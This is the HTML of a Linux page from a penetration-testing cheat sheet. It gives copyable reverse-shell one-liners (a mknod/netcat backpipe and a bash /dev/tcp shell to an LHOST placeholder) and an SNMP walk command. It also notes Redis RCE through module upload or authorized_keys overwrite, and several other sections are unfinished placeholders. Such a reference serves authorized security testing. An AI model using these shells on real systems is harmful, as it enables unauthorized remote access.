<!DOCTYPE html>
<html class="h-100" lang="en">


<head>
    <meta charset="utf-8">
    <title>penref // linux</title>
    
    <!-- CSS -->
    <link rel="stylesheet" href="assets/bootstrap.css">
    <link rel="stylesheet" href="assets/main.css">
    <style type="text/css">
		.hidden {display:none;}
    </style>
    <script type="text/javascript" src="assets/jquery.min.js"></script>
    <script type="text/javascript">
		$('html').addClass('hidden');
		$(document).ready(function() {
		  $('html').show();
		  $('#hosts').click(function() {
		       $('.RHOST').text($('#RHOST').val().trim());
		       $('.LHOST').text($('#LHOST').val().trim());
		  });
	    });
   </script>
</head>

<body class="d-flex flex-column h-100">
    <header>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
    
        <!-- Navbar Title -->
        <a class="navbar-brand" href="index.html"><b><i>penref</i></b></a>
        
        <!-- Collapsable Menu Button -->
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse">
            <span class="navbar-toggler-icon"></span>
        </button>
        
        <!-- Navbar -->
        <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav mr-auto">
                <li class="nav-item ">
                    <a class="nav-link" href="index.html">General</a>
                </li>
                <li class="nav-item ">
                    <a class="nav-link" href="windows.html">Windows</a>
                </li>
                <li class="nav-item active">
                    <a class="nav-link" href="linux.html">Linux</a>
                </li>
                </li>
                    <li class="nav-item ">
                    <a class="nav-link" href="webapp.html">Webapp</a>
                </li>
                </li>
                    <li class="nav-item ">
                    <a class="nav-link" href="methodology.html">Methodology</a>
                </li>
                </li>
                    <li class="nav-item ">
                    <a class="nav-link" href="extra.html">Extra</a>
                </li>
            </ul>
            
            <!-- LHOST / RHOST input -->
            <form>
                <div class="form-row justify-content-end">
                    <div class="col-sm-3">
                        <input id="LHOST" "type="text" class="form-control form-control-sm" id="inlineFormInputName" placeholder="LHOST">
                    </div>
                    <div class="col-sm-3">
                        <input id="RHOST" type="text" class="form-control form-control-sm" id="inlineFormInputName" placeholder="RHOST">
                    </div>
                    <div class="col-auto">
                        <button id="hosts" type="button" class="btn btn-sm btn-primary">Update</button>
                    </div>
                </div>
            </form>
        </div>
    </nav>
</header>

                
    <!-- Begin page -->
    <main role="main" class="flex-shrink-0">
        <div class="container">
            
            <!-- Page title and subtitle -->
            <h1 class="mt-5">
                <code><b><i>linux</i></b></code>
            </h1><br>
            <section>
                <p class="lead">Linux-specific snippets and methods</p>

<!-- Enumeration -->
<h3>Enumeration</h3>




<h3>Entry</h3>

<h5>reverse shells</h5>
   



<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#rs_mknod">mknod method</a>
    </li>
    
     
        <li class="nav-item">
            <a class="nav-link" data-toggle="tab" href="#rs_devtcp">/dev/tcp method</a>
        </li>
        
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="rs_mknod">
        
On your local computer:
<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
<code>nc -nvlp 443</code><br>
</div>
On remote computer:
<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
<code>mknod /tmp/backpipe p && </code><br>
</div>
<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
<code>/bin/sh 0< /tmp/backpipe &#124; nc <span class='LHOST'>LHOST</span> 443 1> /tmp/backpipe </code>
</div>

    </div>
    
    
    <div class="tab-pane" id="rs_devtcp">
        
On local:
<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
<code>nc -nvlp 443</code><br>
</div>
On remote:
<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
<code>bash -i >& /dev/tcp/<span class='LHOST'>LHOST</span>/443 0>&1</code><br>
</div>
    </div>
    
    
</div><br>



<h5>ssh // 22</h5>
   



<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#ssh_bruteforcing">Bruteforcing</a>
    </li>
    
     
        <li class="nav-item">
            <a class="nav-link" data-toggle="tab" href="#ssh_exploitation">Exploitation</a>
        </li>
        
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="ssh_bruteforcing">
        
bruetforcing

    </div>
    
    
    <div class="tab-pane" id="ssh_exploitation">
        
There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <span><code>searchsploit</code></span> it.

    </div>
    
    
</div><br>



<h5>snmp // 161</h5>
   



<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#snmp_getinfo">Walk to Gather Info</a>
    </li>
    
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="snmp_getinfo">
        
Get info from v1 SNMP:
<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
<code>snmpwalk -c public -v1 <span class='RHOST'>RHOST</span></code>
</div>

    </div>
    
    
</div><br>


 
<!-- postgres -->
<h5>postgres // 5432</h5>


 



<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#psql_default_creds">Default Creds</a>
    </li>
    
     
        <li class="nav-item">
            <a class="nav-link" data-toggle="tab" href="#psql_exploitation">Exploitation</a>
        </li>
        
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="psql_default_creds">
        
postgres default creds content here


    </div>
    
    
    <div class="tab-pane" id="psql_exploitation">
        

postgres can be 'exploited' with the code exec feature. it's not a real exploit.


    </div>
    
    
</div><br>



<!-- redis -->
<h5>redis // 6379</h5>


 



<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#redis_creds">Default Creds</a>
    </li>
    
     
        <li class="nav-item">
            <a class="nav-link" data-toggle="tab" href="#redis_exploit">Exploitation</a>
        </li>
        
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="redis_creds">
        

Redis default creds are nonexistent (try with <span><code>rediscli -h <span class='RHOST'>RHOST</span></code></span>).


    </div>
    
    
    <div class="tab-pane" id="redis_exploit">
        

Redis (4.x/5.x) RCE can be achieved through two misconfiguraitons.
<ol>
    <li>Malicious module uploading via <span><code>slaveof</code></span> command (<a href='https://github.com/Ridter/redis-rce'>script</a>)</li>
    <li>Misconfiguration of allowing backup to overwrite SSH <span><code>authorized_keys</code></span> (<a href='https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py'>script</a>)</li>
</ol>


    </div>
    
    
</div><br>



<!-- Privesc -->
<h3>Privilege Escalation</h3>
	
<!-- ssh -->

  



<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#priv1">privone</a>
    </li>
    
     
        <li class="nav-item">
            <a class="nav-link" data-toggle="tab" href="#priv2">privtwo</a>
        </li>
        
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="priv1">
        
PRIVESC 1


    </div>
    
    
    <div class="tab-pane" id="priv2">
        

PRIVESC2.


    </div>
    
    
</div><br>



<!-- Looting and Scrounging -->
<h3>Looting and Scrounging</h3>

<!-- Other Avenues -->
<h5>Finding other Avenues of Privesc</h5>
 





<ul class="nav nav-tabs" role="tablist">
    <li class="nav-item">
        <a class="nav-link show active" data-toggle="tab" href="#other_privesc">Standard Privesc</a>
    </li>
    
    
</ul>

<div class="tab-content">
    <div class="tab-pane show active" id="other_privesc">
        

Lorem ipsum. Other avenues.


    </div>
    
    
</div><br>



<!-- Informational Vulns
<h5>Finding Informational Vulns</h5>  -->




            </section>
            
        </div>
    </main><br>
    
    <!-- Footer -->
<footer class="footer mt-auto py-3">
    <div class="container">
        <span class="text-muted">
            @<a href="https://github.com/sourque">sourque</a> // made with bootstrap and 
            <img src="assets/cooldoge.gif" style="width: 25px; padding-left: 0.2em; padding-bottom: 0.3em;"/>
        </span>
    </div>
</footer>



    <!-- JS -->
    <script src="assets/bootstrap.js"></script>
    <script src="assets/main.js"></script>

</body>
</html>
